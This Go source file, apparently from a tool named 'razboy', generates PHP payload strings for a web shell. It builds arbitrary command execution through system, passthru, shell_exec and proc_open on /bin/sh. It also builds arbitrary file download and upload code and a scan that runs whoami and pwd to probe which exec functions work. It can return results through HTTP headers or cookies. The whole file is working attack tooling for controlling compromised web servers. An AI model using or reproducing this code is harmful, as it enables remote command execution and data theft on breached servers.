package razboy

func _getPassthruCMD(cmd, letter string) string {
	return "ob_start();passthru('" + cmd + "');$" + letter + "=ob_get_contents();ob_end_clean();"
}

func _getSystemCMD(cmd, letter string) string {
	return "ob_start();system('" + cmd + "');$" + letter + "=ob_get_contents();ob_end_clean();"
}

func _getShellExecCMD(cmd, letter string) string {
	return "$" + letter + "=shell_exec('" + cmd + "');"
}

func _getProcOpenCMD(cmd, scope, proc, letter string) string {
	if scope == "" {
		scope = "./"
	}

	return `$opt = array(0=>array('pipe','r'),1=>array('pipe','w'),2=>array('pipe', 'w'));
	$scope='` + scope + `';
	$proc=proc_open('` + proc + `', $opt,$pipes,$scope);
	if(is_resource($proc)){
		fwrite($pipes[0],'` + cmd + `');
		fclose($pipes[0]);
		$s=stream_get_contents($pipes[1]);
		fclose($pipes[1]);
		$e=stream_get_contents($pipes[2]);
		fclose($pipes[2]);
		$c=proc_close($proc);
		$` + letter + `=array('success'=>$s,'error'=>$e,'code'=>$c);
		$` + letter + `=json_encode($` + letter + `);
	}`
}

func CreateCMD(cmd, scope string, method int) string {
	var contexter, shellCMD string

	if scope != "" {
		contexter = "cd " + scope + " && "
	}

	shellCMD = contexter + cmd

	switch method {
	case SM_SHELL_EXEC:
		shellCMD = _getShellExecCMD(shellCMD, "r")
	case -1:
		shellCMD = _getProcOpenCMD(cmd, scope, "/bin/sh", "r")
	case SM_PASSTHRU:
		shellCMD = _getPassthruCMD(shellCMD, "r")
	default:
		shellCMD = _getSystemCMD(shellCMD, "r")
	}

	return shellCMD
}

func CreateDownload(dir string) string {
	var php string

	php = `if(file_exists('` + dir + `')){
		header('Content-Description: File Transfer');
    	header('Content-Type: application/octet-stream');
    	header('Content-Transfer-Encoding: binary');
    	header('Expires: 0');
    	header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
    	header('Pragma: public');
		header('Content-Length: ' . filesize('` + dir + `'));
		header('Content-Disposition: attachment; filename='.basename('` + dir + `'));
		readfile('` + dir + `');exit();
	}`

	return php
}

func CreateUpload(dir string) string {
	return "$file=$_FILES['file'];move_uploaded_file($file['tmp_name'], '" + dir + "');" + "if(file_exists('" + dir + "')){echo(" + PHPEncode("1") + ");}"
}

func CreateScan() string {
	return `ob_start();system("echo 1;");$r["S"]["sy"]=trim(ob_get_contents());ob_end_clean();
$r["S"]["sh"]=trim(shell_exec("echo 1;"));$r["I"]["w"]=trim(shell_exec("whoami;"));$r["I"]["p"]=trim(shell_exec("pwd;"));
ob_start();passthru("echo 1;");$r["S"]["pa"]=trim(ob_get_contents());ob_end_clean();
$opt=array(0=>array('pipe','r'),1=>array('pipe','w'),2=>array('pipe', 'w'));$proc=proc_open("/bin/sh", $opt, $pipes, "./");
if(is_resource($proc)){fwrite($pipes[0], "echo 1;");fclose($pipes[0]);$s=stream_get_contents($pipes[1]);$e=stream_get_contents($pipes[2]);proc_close($proc);if($e===""){$r["S"]["pr"]=trim($s);}}
$r=json_encode($r);`
}

func AddAnswer(method int, parameter string) string {
	if method == M_HEADER {
		return "header('" + parameter + ":' . " + PHPEncode("$r") + ");exit();"
	}

	if method == M_COOKIE {
		return "setcookie('" + parameter + "', " + PHPEncode("$r") + ");exit();"
	}

	return "echo(" + PHPEncode("$r") + ");exit();"
}
